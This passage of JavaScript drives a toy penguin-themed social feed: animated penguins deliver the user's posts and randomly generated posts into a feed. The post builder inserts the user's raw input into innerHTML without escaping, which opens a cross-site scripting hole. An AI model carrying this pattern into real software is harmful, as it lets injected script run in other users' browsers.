        state.occupiedPositions.set(position, Date.now());
        
        return position;
    }
};

/*
Pengu Animation
*/

const AnimationModule = {
    createPenguContainer() {
        const template = document.getElementById('penguTemplate');
        const penguClone = template.content.cloneNode(true);
        return penguClone.querySelector('.pengu-container');
    },

    setupPenguAnimation(container, stopPosition) {
        container.style.setProperty('--stop-position', stopPosition);
        container.classList.add('animate');
    },

    scheduleSoundAndCallback(postCallback, container) {
        setTimeout(() => {
            AudioModule.playNootNoot();
            
            if (postCallback) {
                const coordinates = this.getPenguCoordinates(container);
                postCallback(coordinates.x, coordinates.y);
            }
        }, CONFIG.animation.soundDelay);
    },

    scheduleCleanup(container) {
        setTimeout(() => {
            container.remove();
        }, CONFIG.animation.totalDuration);
    },

    getPenguCoordinates(container) {
        const rect = container.getBoundingClientRect();
        return {
            x: rect.left + rect.width / 2,
            y: rect.top + CONFIG.post.verticalOffset
        };
    },

    animate(postCallback) {
        const stage = document.getElementById('penguStage');
        const container = this.createPenguContainer();
        const stopPosition = PositionManager.getRandomPosition();
        
        this.setupPenguAnimation(container, stopPosition);
        stage.appendChild(container);
        
        this.scheduleSoundAndCallback(postCallback, container);
        this.scheduleCleanup(container);
    }
};

/*
Utilities
*/

const Utils = {
    formatTime(date) {
        const hours = date.getHours().toString().padStart(2, '0');
        const minutes = date.getMinutes().toString().padStart(2, '0');
        return `${hours}:${minutes}`;
    },

    getRandomElement(array) {
        return array[Math.floor(Math.random() * array.length)];
    },

    getRandomInterval(min, max) {
        return Math.random() * (max - min) + min;
    }
};


/*
Post Management
*/

const PostManager = {
    createPostElement(content, isUser, startX = null, startY = null) {
        const post = document.createElement('div');
        post.className = 'post';
        
        let avatar, username;
        if (isUser) {
            avatar = '🐧';
            username = 'YOU';
        } else {
            const randomUser = Utils.getRandomElement(CONFIG.users);
            avatar = randomUser.avatar;
            username = randomUser.username;
        }
        
        const time = Utils.formatTime(new Date());
        
        post.innerHTML = `
            <div class="post-header">
                <span class="post-avatar">${avatar}</span>
                <span class="post-user">${username}</span>
                <span class="post-time">${time}</span>
            </div>
            <div class="post-content">${content}</div>
        `;
        
        if (startX !== null && startY !== null) {
            this.applyFlyingAnimation(post, startX, startY);
        }
        
        return post;
    },

    applyFlyingAnimation(post, startX, startY) {
        const feed = document.getElementById('feed');
        const feedRect = feed.getBoundingClientRect();
        
        const targetX = feedRect.left;
        const targetY = feedRect.top;
        const deltaX = targetX - (startX - CONFIG.post.approximateWidth / 2);
        const deltaY = targetY - startY;
        
        // Set initial position and animation properties
        Object.assign(post.style, {
            position: 'fixed',
            left: (startX - CONFIG.post.approximateWidth / 2) + 'px',
            top: startY + 'px',
            width: CONFIG.post.approximateWidth + 'px',
            transformOrigin: 'center center',
            zIndex: '10000'
        });
        
        post.style.setProperty('--start-x', '0px');
        post.style.setProperty('--start-y', '0px');
        post.style.setProperty('--end-x', deltaX + 'px');
        post.style.setProperty('--end-y', deltaY + 'px');
        
        post.classList.add('post-flying');
        
        // Reset to normal position after animation
        setTimeout(() => {
            Object.assign(post.style, {
                position: '',
                left: '',
                top: '',
                width: '',
                transformOrigin: '',
                zIndex: ''
            });
            post.classList.remove('post-flying');
        }, CONFIG.animation.flyingPostDuration);
    },

    addToFeed(post) {
        const feed = document.getElementById('feed');
        feed.insertBefore(post, feed.firstChild);
    },

    createAndAddPost(content, isUser, penguX = null, penguY = null) {
        const post = this.createPostElement(content, isUser, penguX, penguY);
        this.addToFeed(post);
    }
};

/*
User Actions
*/

const UserActions = {
    postRoar() {
        const postInput = document.getElementById('postInput');
        const content = postInput.value.trim();
        
        if (content === '') return;
        
        postInput.value = '';
        
        AnimationModule.animate((penguX, penguY) => {
            PostManager.createAndAddPost(content, true, penguX, penguY);
        });
    }
};

/*
Random Post Simulation
*/

const RandomPostSimulator = {
    scheduleNextPost() {
        const interval = Utils.getRandomInterval(
            CONFIG.timing.minPostInterval,
            CONFIG.timing.maxPostInterval
        );
        
        setTimeout(() => {
            this.generateRandomPost();
        }, interval);
    },

    generateRandomPost() {
        const content = Utils.getRandomElement(CONFIG.randomPosts);
        
        AnimationModule.animate((penguX, penguY) => {
            PostManager.createAndAddPost(content, false, penguX, penguY);
        });
        
        this.scheduleNextPost();
    },

    start() {
        setTimeout(() => {
            this.generateRandomPost();
        }, CONFIG.timing.initialPostDelay);
    }
};

/*
Init
*/

function initializeApp() {
    const postBtn = document.getElementById('postBtn');
    postBtn.addEventListener('click', () => UserActions.postRoar());
    
    // Start random post simulation
    window.addEventListener('load', () => {
        RandomPostSimulator.start();
    });
}

// Start application
initializeApp();
